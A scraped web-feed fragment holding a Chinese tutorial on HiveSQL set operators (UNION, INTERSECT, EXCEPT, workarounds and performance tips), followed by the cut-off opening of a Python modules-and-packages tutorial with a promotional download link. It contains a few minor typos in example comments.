#ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在大数据分析过程中，整合多源数据的需求十分常见，此时集合运算发挥着关键作用。本文将重点介绍HiveSQL中的集合运算方法，助力数据分析师高效完成复杂的数据整合工作。</p>
<h2 data-id="heading-0">为什么需要集合运算？</h2>
<p>假设你手头有来自多个业务系统的用户数据，包括App、Web端和小程序等。当前需求是：</p>
<ul>
<li>统计全平台的独立用户数</li>
<li>找出同时使用App和Web的高价值用户</li>
<li>分析只通过Web访问但从未下载App的用户特征</li>
</ul>
<p>这正是集合运算的典型应用场景。熟练掌握HiveSQL的集合运算，可以让你高效处理这类复杂的数据整合需求。HiveSQL提供了三大核心集合运算符：UNION（并集）、INTERSECT（交集）和EXCEPT（差集，在某些数据库中也被称为MINUS）。</p>
<h2 data-id="heading-1">三大核心集合运算符详解</h2>
<p><strong>1. UNION/UNION ALL： 数据的"加法"运算</strong></p>
<p>UNION ALL​ 是最常用的集合运算符，它简单地将两个查询结果合并，不做任何去重处理。在Hive中，这是一个非常高效的操作，因为它避免了复杂的Shuffle和Reduce过程。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 合并2024年和205年的订单数据</span>
<span class="hljs-keyword">SELECT</span> order_id, user_id, amount, <span class="hljs-string">'2024'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">year</span> 
<span class="hljs-keyword">FROM</span> orders_2023
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> order_id, user_id, amount, <span class="hljs-string">'2025'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">year</span>
<span class="hljs-keyword">FROM</span> orders_2024;
</code></pre>
<p>性能小贴士：UNION ALL的性能远优于 UNION。如果你能确定数据没有重复，或者不在乎重复数据，请优先使用 UNION ALL。</p>
<p>UNION​ 则会在合并后自动去重。这个操作会触发Reduce任务，可能会比较耗时：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 获取全平台的去重用户ID</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> app_users
<span class="hljs-keyword">UNION</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> web_users;
</code></pre>
<p>实际应用场景：</p>
<p>合并多个分区的数据
整合来自不同数据源但结构相同的数据
创建历史数据快照</p>
<blockquote>
<p>注：</p>
<p>两个查询的列数必须相同</p>
<p>对应列的数据类型要兼容</p>
<p>默认按第一个查询的列名显示结果</p>
</blockquote>
<p><strong>2. INTERSECT：寻找数据的"交集"</strong></p>
<p>INTERSECT用于找出同时存在于两个数据集中的记录。这就像数学中的集合交集操作。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 找出既购买过电子产品又购买过书籍的用户</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> orders_electronics
<span class="hljs-keyword">INTERSECT</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> orders_books;
</code></pre>
<p>重要提示：</p>
<p>Hive 2.2.0及以上版本才原生支持INTERSECT。如果你的Hive版本较老，可以使用以下</p>
<p>替代方案：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用JOIN实现INTERSECT功能</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> a.user_id
<span class="hljs-keyword">FROM</span> orders_electronics a
<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> orders_books b <span class="hljs-keyword">ON</span> a.user_id <span class="hljs-operator">=</span> b.user_id;
 
<span class="hljs-comment">-- 使用EXISTS实现</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> user_id
<span class="hljs-keyword">FROM</span> orders_electronics a
<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span> (
    <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> orders_books b 
    <span class="hljs-keyword">WHERE</span> a.user_id <span class="hljs-operator">=</span> b.user_id
);
</code></pre>
<p><strong>3. EXCEPT：找出数据的"差集"</strong></p>
<p>EXCEPT返回只存在于第一个查询结果中，但不存在于第二个查询结果中的记录。在某些数据库中，这个操作也叫MINUS。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 找出注册了但从未下过单的用户</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> registered_users
<span class="hljs-keyword">EXCEPT</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_users;
</code></pre>
<p>同样，对于Hive 2.2.0以下的版本，我们可以用其他方式实现：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用LEFT JOIN实现EXCEPT功能</span>
<span class="hljs-keyword">SELECT</span> a.user_id
<span class="hljs-keyword">FROM</span> registered_users a
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> order_users b <span class="hljs-keyword">ON</span> a.user_id <span class="hljs-operator">=</span> b.user_id
<span class="hljs-keyword">WHERE</span> b.user_id <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;
 
<span class="hljs-comment">-- 使用NOT IN实现（注意NULL值处理）</span>
<span class="hljs-keyword">SELECT</span> user_id
<span class="hljs-keyword">FROM</span> registered_users
<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (
    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_users 
    <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);
</code></pre>
<h2 data-id="heading-2">集合运算的黄金法则</h2>
<h3 data-id="heading-3">法则1：结构一致性</h3>
<p>所有参与集合运算的查询必须具有相同的列数和兼容的数据类型。列名可以不同，最终结果集的列名会采用第一个查询的列名。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 正确的写法</span>
<span class="hljs-keyword">SELECT</span> user_id, username, <span class="hljs-string">'app'</span> <span class="hljs-keyword">as</span> source <span class="hljs-keyword">FROM</span> app_users
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> user_id, username, <span class="hljs-string">'web'</span> <span class="hljs-keyword">FROM</span> web_users;
 
<span class="hljs-comment">-- 错误的写法：列数不匹配</span>
<span class="hljs-keyword">SELECT</span> user_id, username, age <span class="hljs-keyword">FROM</span> table_a
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> user_id, username <span class="hljs-keyword">FROM</span> table_b; <span class="hljs-comment">-- 这里会报错！</span>
</code></pre>
<h3 data-id="heading-4">法则2：理解执行顺序</h3>
<p>集合运算符默认按书写顺序从左到右执行。如果需要改变执行顺序，必须使用括号。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 先合并A和B，再与C取交集</span>
(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_a
 <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
 <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_b)
<span class="hljs-keyword">INTERSECT</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_c;
</code></pre>
<h3 data-id="heading-5">法则3：慎用ORDER BY和LIMIT</h3>
<p>在集合运算中使用ORDER BY和LIMIT时要注意作用范围：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 这个查询在大多数情况下不会按预期工作</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_a
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_b
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">100</span>;
 
<span class="hljs-comment">-- 正确的写法：先限制各子查询结果，再合并</span>
(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_a <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">50</span>)
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_b <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">50</span>)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">100</span>;
</code></pre>
<h2 data-id="heading-6">性能优化实战技巧</h2>
<h3 data-id="heading-7">技巧1：能用UNION ALL就不用UNION</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 不推荐的写法</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs_202401
<span class="hljs-keyword">UNION</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs_202402
<span class="hljs-keyword">UNION</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs_202403;
 
<span class="hljs-comment">-- 推荐的写法：先合并再去重</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> user_id <span class="hljs-keyword">FROM</span> (
    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs_202401
    <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs_202402
    <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs_202403
) t;
</code></pre>
<h3 data-id="heading-8">技巧2：合理使用Map-side优化</h3>
<p>对于特定的集合运算，可以考虑在Map端进行部分聚合，减少Shuffle数据量：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 在子查询中先进行去重</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> user_id <span class="hljs-keyword">FROM</span> (
    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> user_id <span class="hljs-keyword">FROM</span> table_a
    <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> user_id <span class="hljs-keyword">FROM</span> table_b
) t;
</code></pre>
<h3 data-id="heading-9">技巧3：利用分区和索引</h3>
<p>如果涉及的表有分区，确保在WHERE条件中使用分区字段，减少扫描的数据量：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs <span class="hljs-keyword">WHERE</span> dt <span class="hljs-operator">=</span> <span class="hljs-string">'2025-01-01'</span>
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> logs <span class="hljs-keyword">WHERE</span> dt <span class="hljs-operator">=</span> <span class="hljs-string">'2025-01-02'</span>;
</code></pre>
<h2 data-id="heading-10">实战案例：用户行为分析</h2>
<p>假设我们有三个表，分别记录了用户在不同平台的行为：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建示例表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> app_clicks (
    user_id <span class="hljs-type">BIGINT</span>,
    click_time <span class="hljs-type">TIMESTAMP</span>,
    page_url STRING
);
 
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> web_clicks (
    user_id <span class="hljs-type">BIGINT</span>,
    click_time <span class="hljs-type">TIMESTAMP</span>,
    page_url STRING
);
 
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> app_users (
    user_id <span class="hljs-type">BIGINT</span>,
    reg_time <span class="hljs-type">TIMESTAMP</span>,
    device STRING
);
</code></pre>
<h3 data-id="heading-11">场景1：分析全平台用户行为</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 合并App和Web的点击流</span>
<span class="hljs-keyword">SELECT</span> user_id, click_time, page_url, <span class="hljs-string">'app'</span> <span class="hljs-keyword">as</span> platform
<span class="hljs-keyword">FROM</span> app_clicks
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> user_id, click_time, page_url, <span class="hljs-string">'web'</span>
<span class="hljs-keyword">FROM</span> web_clicks;
</code></pre>
<h3 data-id="heading-12">场景2：找出全渠道活跃用户</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 同时在App和Web都有行为的用户</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> app_clicks
<span class="hljs-keyword">INTERSECT</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> web_clicks;
</code></pre>
<h3 data-id="heading-13">场景3：分析单一渠道用户</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 只使用Web，不使用App的用户</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> web_clicks
<span class="hljs-keyword">EXCEPT</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> app_clicks;
</code></pre>
<h2 data-id="heading-14">常见问题与解决方案</h2>
<h3 data-id="heading-15">问题1：数据类型不匹配</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 错误：user_id类型不一致</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CAST</span>(user_id <span class="hljs-keyword">AS</span> STRING) <span class="hljs-keyword">as</span> uid <span class="hljs-keyword">FROM</span> table_a
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> table_b;  <span class="hljs-comment">-- 这里user_id是BIGINT</span>
 
<span class="hljs-comment">-- 解决方案：显式转换数据类型</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CAST</span>(user_id <span class="hljs-keyword">AS</span> STRING) <span class="hljs-keyword">as</span> uid <span class="hljs-keyword">FROM</span> table_a
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CAST</span>(user_id <span class="hljs-keyword">AS</span> STRING) <span class="hljs-keyword">FROM</span> table_b;
</code></pre>
<h3 data-id="heading-16">问题2：NULL值处理</h3>
<p>集合运算中的NULL值需要特别注意：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- INTERSECT和EXCEPT会正确处理NULL值</span>
<span class="hljs-comment">-- 但NOT IN对NULL值敏感</span>
<span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> table_a
<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (
    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> table_b
    <span class="hljs-comment">-- 如果table_b.user_id可能有NULL，需要过滤</span>
);
</code></pre>
<h3 data-id="heading-17">问题3：大表关联的性能问题</h3>
<p>当使用JOIN模拟集合运算时，如果表很大，考虑使用MapJoin：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 设置MapJoin优化</span>
<span class="hljs-keyword">SET</span> hive.auto.convert.join<span class="hljs-operator">=</span><span class="hljs-literal">true</span>;
<span class="hljs-keyword">SET</span> hive.mapjoin.smalltable.filesize<span class="hljs-operator">=</span><span class="hljs-number">25000000</span>;
 
<span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/*+ MAPJOIN(b) */</span> a.user_id
<span class="hljs-keyword">FROM</span> big_table a
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> small_table b <span class="hljs-keyword">ON</span> a.user_id <span class="hljs-operator">=</span> b.user_id
<span class="hljs-keyword">WHERE</span> b.user_id <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;
</code></pre>
<h2 data-id="heading-18">总结</h2>
<p>HiveSQL的集合运算为数据分析师提供了强大的数据整合能力。记住以下几点：</p>
<ul>
<li>要合并数据 → 用 或 UNIONUNION ALL</li>
<li>要找共同点 → 用 INTERSECT</li>
<li>要找不同点 → 用 EXCEPT</li>
<li>要提高性能 → 优先考虑 UNION ALL</li>
</ul>
<blockquote>
<p>注：</p>
<p>选择合适运算符：根据是否需要去重，选用UNION（去重）或UNION ALL（不去重）</p>
<p>版本兼容性提示：INTERSECT和EXCEPT运算符要求Hive版本在2.2.0及以上</p>
<p>特殊情况处理：需特别注意NULL值的处理及数据类型转换问题</p>
</blockquote>
<p>集合运算看似简单，但在实际的大数据场景中，合理使用这些运算符能显著提升查询效率和代码可读性。希望这篇指南能帮助你在日常工作中更加游刃有余地处理数据整合任务！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python编程实战：从函数到模块化——创建自己的模块与包]]></title>    <link>https://juejin.cn/post/7584007232411992070</link>    <guid>https://juejin.cn/post/7584007232411992070</guid>    <pubDate>2025-12-16T08:08:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584007232411992070" data-draft-id="7584007232411910150" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python编程实战：从函数到模块化——创建自己的模块与包"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-16T08:08:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="站大爷IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python编程实战：从函数到模块化——创建自己的模块与包
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    站大爷IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:08:36.000Z" title="Tue Dec 16 2025 08:08:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>免费编程软件「python+pycharm」
链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F48a86be2fdc0" target="_blank" title="https://pan.quark.cn/s/48a86be2fdc0" ref="nofollow noopener noreferrer">pan.quark.cn/s/48a86be2f…</a></strong></p>
<p>在Python项目中，当代码量超过500行时，将所有功能堆砌在一个文件中会变得难以维护。就像整理书房时，把所有书籍堆在书桌上会让人找不到需要的资料，而分门别类放在书架上则能快速定位。Python的模块化编程正是这种整理思路的体现——通过将代码拆分成独立模块和包，让项目结构清晰、复用性强。</p>
<h2 data-id="heading-0">一、模块：代码的独立单元</h2>
<h3 data-id="heading-1">1.1 模块的本质</h3>
<p>模块是包含Python定义和语句的.py文件，每个文件都是一个独立模块。当导入模块时，Python会执行该文件中的所有代码，并将变量、函数和类加载到内存。例如创建<code>math_tools.py</code>文件：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># math_tools.py</span>
PI = <span class="hljs-number">3.1415926</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">circle_area</span>(<span class="hljs-params">radius</span>):
    <span class="hljs-keyword">return</span> PI * radius ** <span class="hljs-number">2</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">sphere_volume</span>(<span class="hljs-params">radius</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>/<span class="hljs-number">3</span> * PI * radius ** <span class="hljs-number">3</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在其他文件中导入该模块后，即可使用其中的功能：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> math_tools

